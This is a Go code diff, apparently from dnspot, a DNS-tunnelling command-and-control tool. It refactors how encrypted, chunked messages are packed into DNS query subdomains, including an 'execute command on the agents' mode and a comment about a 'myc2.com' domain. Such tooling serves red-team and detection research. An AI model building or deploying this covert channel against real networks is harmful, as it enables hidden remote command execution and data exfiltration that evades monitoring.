@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"compress/gzip"
 	"errors"
+	"fmt"
 	"math/rand"
 	"sort"
 	"strings"
@@ -11,16 +12,20 @@ import (
 
 	"github.com/lunixbochs/struc"
 	"github.com/miekg/dns"
-	"github.com/mosajjal/dnspot/conf"
 	"github.com/mosajjal/dnspot/cryptography"
 )
 
 const (
-	PAYLOAD_SIZE = int(80)
-	CHUNK_SIZE   = int(80)
+	PAYLOAD_SIZE         = int(70)
+	CHUNK_SIZE           = uint8(90)
+	CompressionThreshold = 1024 * 2 // 2KB
 )
 
+// MsgType defines the type of each message (healtcheck, synctime, execute command etc)
+// This is different from CmdType
 type MsgType uint8
+
+// CmdType defines which type of work this tunnel with be. currently Exec and Echo are supported
 type CmdType uint8
 
 // Message codes
@@ -33,7 +38,9 @@ const (
 )
 
 const (
+	// CommandExec execute command on the agents
 	CommandExec CmdType = iota
+	// CommandEcho is a chat system. Not echo lol
 	CommandEcho
 )
 
@@ -47,21 +54,25 @@ const (
 // if ParentPartID != 0 -> incoming packets in the order of their PartID
 // if IsLastPart == true -> last packet
 
+// MessagePacket is the payload that will be on the wire for each DNS query and response
 type MessagePacket struct {
-	Payload      [80]byte `struc:"[80]byte,little"`
-	TimeStamp    uint32   `struc:"uint32,little"`
-	PartID       uint16   `struc:"uint16,little"`
-	ParentPartID uint16   `struc:"uint16,little"`
-	MessageType  MsgType  `struc:"uint8,little"`
-	Command      CmdType  `struc:"uint8,little"`
-	IsLastPart   bool     `struc:"bool,little"`
+	TimeStamp     uint32  `struc:"uint32,little"`
+	PartID        uint16  `struc:"uint16,little"`
+	ParentPartID  uint16  `struc:"uint16,little"`
+	IsLastPart    bool    `struc:"bool,little"`
+	MessageType   MsgType `struc:"uint8,little"`
+	Command       CmdType `struc:"uint8,little"`
+	PayloadLength uint8   `struc:"uint8,little,sizeof=Payload"`
+	Payload       []byte  `struc:"[]byte,little"`
 }
 
+// MessagePacketWithSignature adds Signature to each packet separetely to help with reconstruction of packets
 type MessagePacketWithSignature struct {
 	Signature *cryptography.PublicKey
 	Msg       MessagePacket
 }
 
+// PerformExternalAQuery is a very basic A query provider. TODO: this needs to move to github.com/mosajjal/dnsclient
 func PerformExternalAQuery(Q string, server string) (*dns.Msg, error) {
 	question := dns.Question{Name: Q, Qtype: dns.TypeA, Qclass: dns.ClassINET}
 	c := new(dns.Client)
@@ -76,17 +87,22 @@ func PerformExternalAQuery(Q string, server string) (*dns.Msg, error) {
 	return in, err
 }
 
-func insertNth(s string, n int) string {
+// inserNth takes a string and inserts a dot char every nth char.
+// returns the number of dots inserted, plus the modified string
+func insertNth(s string, n int) (int, string) {
 	var buffer bytes.Buffer
-	var n_1 = n - 1
-	var l_1 = len(s) - 1
+	numberOfDots := 0
+	var n1 = n - 1
+	var l1 = len(s) - 1
 	for i, rune := range s {
 		buffer.WriteRune(rune)
-		if i%n == n_1 && i != l_1 {
-			buffer.WriteRune('.')
+		if i%n == n1 && i != l1 {
+			numberOfDots++
+			buffer.WriteByte('.') //dot char in DNS
+			// buffer.WriteRune('.')
 		}
 	}
-	return buffer.String()
+	return numberOfDots, buffer.String()
 }
 
 func split(buf []byte, lim int) [][]byte {
@@ -102,13 +118,13 @@ func split(buf []byte, lim int) [][]byte {
 	return chunks
 }
 
-// Gets a big payload that needs to be sent over the wire, chops it up into smaller limbs and creates a list of messages to be sent. It also sends the parentPartID to make sure the series
+// PreparePartitionedPayload Gets a big payload that needs to be sent over the wire, chops it up into smaller limbs and creates a list of messages to be sent. It also sends the parentPartID to make sure the series
 // of messages are not lost
 func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix string, privateKey *cryptography.PrivateKey, serverPublicKey *cryptography.PublicKey) ([]string, uint16, error) {
 	// TODO: fix duplicate sending
 
 	// handle compression
-	if len(payload) > conf.CompressionThreshold {
+	if len(payload) > CompressionThreshold {
 		var b bytes.Buffer
 		gz, _ := gzip.NewWriterLevel(&b, gzip.BestCompression)
 		if _, err := gz.Write(payload); err != nil {
@@ -126,8 +142,8 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 	var err error
 	var response []string
 	var parentPartID uint16 = 0
-	retryCount := 10
-	limbs := split(payload, CHUNK_SIZE)
+	// retryCount := 1 //todo: retry of >1 could cause message duplicates
+	limbs := split(payload, int(CHUNK_SIZE))
 	if len(limbs) > 1 {
 		msg.IsLastPart = false
 		msg.PartID = 0
@@ -137,28 +153,32 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 	}
 	//todo: maybe a cap on the number of limbs here, as well as some progress logging inside the loop?
 	for i := 0; i < len(limbs); i++ {
-		if retryCount == 0 {
-			return response, parentPartID, errors.New("failed to send message after 10 attempts")
-		}
+		// if retryCount == 0 {
+		// 	return response, parentPartID, errors.New("failed to send message after 10 attempts")
+		// }
 		if i == len(limbs)-1 && len(limbs) > 1 {
 			msg.IsLastPart = true
 		}
-		msg.Payload = [PAYLOAD_SIZE]byte{}
-		copy(msg.Payload[:], limbs[i])
+		// msg.Payload = []byte{}
+		// msg.PayloadLength = uint8(copy(msg.Payload[:], limbs[i]))
+		msg.Payload = limbs[i]
+		msg.PayloadLength = uint8(len(limbs[i]))
 		var buf bytes.Buffer
 		buf.Reset()
 		if err := struc.Pack(&buf, &msg); err != nil {
-			return response, parentPartID, errors.New("failed to encrypt the payload")
+			return response, parentPartID, err
 		}
-		encrypted, err := cryptography.Encrypt(serverPublicKey, privateKey, buf.Bytes())
+		encrypted, err := privateKey.Encrypt(serverPublicKey, buf.Bytes())
 		if err != nil {
-			return response, parentPartID, errors.New("failed to encrypt the payload")
+			return response, parentPartID, err
 		}
 
 		s := cryptography.EncodeBytes(encrypted)
 		// padding
 		// s = strings.ReplaceAll(s, "=", "")
-		response = append(response, insertNth(s, 63)+dnsSuffix)
+		//todo: record number of dots as a char in the query
+		numberofdots, fqdn := insertNth(s, 60)
+		response = append(response, fqdn+"."+fmt.Sprint(numberofdots)+dnsSuffix)
 		msg.PartID++
 	}
 
@@ -182,9 +202,8 @@ func getSubdomainsFromDnsMessage(m *dns.Msg) []string {
 	return res
 }
 
-func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.PrivateKey, publickey *cryptography.PublicKey) ([]MessagePacketWithSignature, error) {
+func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.PrivateKey, publickey *cryptography.PublicKey) ([]MessagePacketWithSignature, bool, error) {
 	out := []MessagePacketWithSignature{}
-
 	listOfSubdomains := getSubdomainsFromDnsMessage(m)
 
 	for _, sub := range listOfSubdomains {
@@ -193,8 +212,21 @@ func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.P
 			// verify incoming domain
 			requestWithoutSuffix := strings.TrimSuffix(sub, suffix)
 			if sub == requestWithoutSuffix {
-				return out, errors.New("invalid request")
+				return out, true, errors.New("request does not have the correct suffix")
 			}
+
+			// remove the number of dots from FQDN
+			lastSubdomainIndex := strings.LastIndex(requestWithoutSuffix, ".")
+			if lastSubdomainIndex == -1 {
+				return out, true, fmt.Errorf("subdomain count mismatch 1 %d %s", lastSubdomainIndex, requestWithoutSuffix) //todo:make this a better logic.
+			}
+			numberOfDots := requestWithoutSuffix[lastSubdomainIndex+1:]
+			requestWithoutSuffix = requestWithoutSuffix[:lastSubdomainIndex]
+
+			if fmt.Sprint(strings.Count(requestWithoutSuffix, ".")) != numberOfDots {
+				return out, true, fmt.Errorf("subdomain count mismatch 2 %s %s", numberOfDots, requestWithoutSuffix) //todo:make this a better logic.
+			}
+
 			msgRaw := strings.Replace(requestWithoutSuffix, ".", "", -1)
 			// // padding
 			// if i := len(msgRaw) % 8; i != 0 {
@@ -203,17 +235,22 @@ func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.P
 
 			msg := cryptography.DecodeToBytes(msgRaw)
 			// basic sanity check on msg length
-			if len(msg) < 16 {
-				return out, errors.New("invalid request")
-			}
+			// commented this out since we're now using variable length
+			// if len(msg) < 32 {
+			// 	return out, true, errors.New("invalid request")
+			// }
 			// if err != nil {
 			// 	return out, errors.New("invalid base36 input: %s", msgRaw)
 			// }
 			// verify signature
-			decrypted, err := cryptography.Decrypt(privatekey, msg)
+			decrypted, err := privatekey.Decrypt(msg)
 			if err != nil {
 				//todo: since a lot of these are noise and duplicates, maybe we can skip putting this as error
-				return out, err
+				// when a DNS client sends a request like a.b.c.d.myc2.com, some recurisve DNS
+				// server don't pass that on to the NS server. instead, they start by sending
+				// d.myc2.com, then c.d.myc2.com and so on, making our job quite difficult
+				// log.Infof("%s, %s", msg, msgRaw) //todo:remove
+				return out, false, err
 			}
 
 			// todo: verify authenticity with public key(s)
@@ -221,14 +258,16 @@ func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.P
 			o.Signature = cryptography.GetPublicKeyFromMessage(msg)
 			err = struc.Unpack(bytes.NewBuffer(decrypted), &o.Msg)
 			if err != nil {
-				return out, errors.New("couldn't unpack message")
+				return out, false, errors.New("couldn't unpack message")
 			}
 			out = append(out, o)
 		}
 	}
-	return out, nil
+	return out, false, nil
 }
 
+// CheckMessageIntegrity gets a list of packets with their signatures
+// and returns another packet list that are sorted, deduplicated and are complete
 func CheckMessageIntegrity(packets []MessagePacketWithSignature) []MessagePacketWithSignature {
 	//sort, uniq and remove duplicates. then check if the message is complete
 
@@ -251,13 +290,13 @@ func CheckMessageIntegrity(packets []MessagePacketWithSignature) []MessagePacket
 	return nil
 }
 
-// a very fast hashing function, mainly used for de-duplication
+// FNV1A a very fast hashing function, mainly used for de-duplication
 func FNV1A(input []byte) uint64 {
 	var hash uint64 = 0xcbf29ce484222325
-	var fnv_prime uint64 = 0x100000001b3
+	var fnvPrime uint64 = 0x100000001b3
 	for _, b := range input {
 		hash ^= uint64(b)
-		hash *= fnv_prime
+		hash *= fnvPrime
 	}
 	return hash
 }
